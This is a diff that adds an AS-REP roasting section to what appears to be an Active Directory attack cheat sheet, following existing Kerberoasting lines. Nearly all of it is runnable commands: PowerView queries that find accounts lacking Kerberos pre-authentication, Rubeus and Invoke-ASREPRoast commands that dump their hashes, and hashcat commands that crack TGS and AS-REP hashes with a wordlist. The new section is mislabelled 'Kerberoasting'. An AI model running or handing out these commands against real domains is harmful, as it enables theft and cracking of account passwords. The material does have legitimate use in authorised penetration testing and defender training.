@@ -69,4 +69,27 @@ PS> .\Rubeus.exe kerberoast /outfile:kerberoasted.txt
 ## Crack TGS tickets
 PS> hashcat -a 0 -m 13100 kerberoasted.txt /usr/share/wordlists/rockyou.txt
 
+# 3. Kerberoasting
+## Identify AS-REP roastable users
+### PowerView-Dev
+PS> Get-DomainUser -PreauthNotRequired | ft samaccountname, pwdlastset 
 
+PS> Get-DomainUser -UACFilter DONT_REQ_PREAUTH,NOT_PASSWORD_EXPIRED | ft samaccountname, pwdlastset
+
+### Rubeus
+PS> .\Rubeus.exe asreproast
+
+### Invoke-ASREPRoast
+PS> Import-Module .\Invoke-ASREPRoast.ps1
+
+PS> Invoke-ASREPRoast
+
+## ASREPRoasting
+### Rubeus
+PS> .\Rubeus.exe asreproast /format:hashcat /outfile:asrephashes.txt
+
+### Invoke-ASREPRoast
+PS> Invoke-ASREPRoast | % { $_.Hash } | Out-File -Encoding ASCII asrephashes.txt
+
+## Cracking AS-REP hash with Hashcat
+PS> hashcat -a 0 -m 18200 asrephashes.txt /usr/share/wordlists/rockyou.txt
